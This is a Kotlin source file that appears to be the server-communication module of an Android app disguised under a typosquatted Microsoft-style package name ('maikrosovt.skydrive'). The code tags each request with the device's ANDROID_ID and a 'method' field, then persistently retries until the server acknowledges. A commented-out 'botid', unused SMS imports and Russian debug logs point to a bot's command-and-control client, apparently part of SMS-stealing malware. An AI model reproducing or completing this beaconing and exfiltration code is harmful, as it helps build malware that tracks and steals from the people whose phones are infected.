package com.maikrosovt.skydrive


import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.telephony.SmsManager
import android.util.Log
import com.android.volley.Request
import com.android.volley.Response
import com.android.volley.VolleyError
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class ServerUtils {


    private val SERVER_URL = "test"

    private val scheduler: ScheduledExecutorService = Executors.newScheduledThreadPool(1)



    fun sendPostRequest(
        context: Context,
        method: String,
        params: JSONObject?,
    ) {
        try {
            val sharedPreferences = context.getSharedPreferences("storage", Context.MODE_PRIVATE)
         //   val botid = sharedPreferences.getString("id", "testid")

            val jsonObject = JSONObject()
            jsonObject.put("id", getAndroidId(context))
            jsonObject.put("method", method)
            if (params != null) {
                for (key in params.keys()) {
                    jsonObject.put(key, params.get(key))
                }
            }

            Log.d("Request", jsonObject.toString())

            val request = JsonObjectRequest(Request.Method.POST, SERVER_URL, jsonObject, //метод POST
                { response ->
                    Log.d("Запрос пришёл!", "Запрос ушёл всё чётко")
                    Log.d("Request", jsonObject.toString())
                    Log.d("Response", response.toString())
                    if (response.has("status") && response.getString("status") == "true") {
                        // Успешный ответ, очищаем сохраненные запросы
                        clearSavedRequests(context)
                    } else {
                        // Ответ не {status: true}, сохраняем запрос
                        saveRequest(context, jsonObject)
                    }
                },
                { error ->
                    error.printStackTrace()
                    Log.d("Ошибка", "Ошибка valley в serverUtils от сервера")
                    Log.d("Request", jsonObject.toString())

                    // Выводим ответ сервера, если он доступен
                    val responseBody = error.networkResponse?.data?.toString(Charsets.UTF_8)
                    Log.d("Response", responseBody ?: "Ответ сервера недоступен")
                    saveRequest(context, jsonObject)

                })

            Volley.newRequestQueue(context).add(request)

            // Отправляем все сохраненные запросы
            sendSavedRequests(context)

        } catch (e: JSONException) {
            // Handle JSON error
            Log.d("Ошибка", "Ошибка json в serverUtils от jsonexception")
        }
    }  //скобка функции sendpostrequest

    private fun saveRequest(context: Context, request: JSONObject) {
        val sharedPreferences = context.getSharedPreferences("storage", Context.MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        val savedRequestsString = sharedPreferences.getString("saved_requests", "[]")
        val savedRequests = JSONArray(savedRequestsString)
        savedRequests.put(request)
        editor.putString("saved_requests", savedRequests.toString())
        editor.apply()
    }

    private fun clearSavedRequests(context: Context) {
        val sharedPreferences = context.getSharedPreferences("storage", Context.MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        editor.remove("saved_requests")
        editor.apply()
    }

    private fun sendSavedRequests(context: Context) {
        val sharedPreferences = context.getSharedPreferences("storage", Context.MODE_PRIVATE)
        val savedRequestsString = sharedPreferences.getString("saved_requests", "[]")
        val savedRequests = JSONArray(savedRequestsString)

        for (i in 0 until savedRequests.length()) {
            val jsonObject = savedRequests.getJSONObject(i)
            Log.d("savedreq", "saved: $jsonObject")
            val request = JsonObjectRequest(Request.Method.POST, SERVER_URL, jsonObject,
                { response ->
                    Log.d("Saved Request", "Saved request sent successfully")
                    Log.d("Response", response.toString())
                    if (response.has("status") && response.getString("status") == "true") {
                        // Успешный ответ, удаляем запрос из сохраненных
                        removeSavedRequest(context, i)
                        stopScheduledSending()
                    }
                },
                { error ->
                    error.printStackTrace()
                    Log.d("Saved Request Error", "Error sending saved request")
                    //тут запустить эту функцию каждые 10 секунд, пока не дойдут все запросы
                    startScheduledSending(context)
                })
            Volley.newRequestQueue(context).add(request)
        }
    }

    private fun removeSavedRequest(context: Context, index: Int) {
        val sharedPreferences = context.getSharedPreferences("storage", Context.MODE_PRIVATE)
        val editor = sharedPreferences.edit()
        val savedRequestsString = sharedPreferences.getString("saved_requests", "[]")
        val savedRequests = JSONArray(savedRequestsString)
        if (index >= 0 && index < savedRequests.length()) {
            savedRequests.remove(index)
        }
        editor.putString("saved_requests", savedRequests.toString())
        editor.apply()
    }


    fun startScheduledSending(context: Context) {
        scheduler.scheduleAtFixedRate({
            sendSavedRequests(context)
        }, 0, 10, TimeUnit.SECONDS)
    }

    fun stopScheduledSending() {
        scheduler.shutdownNow()
    }

    fun getAndroidId(context: Context): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

} //скобка класса


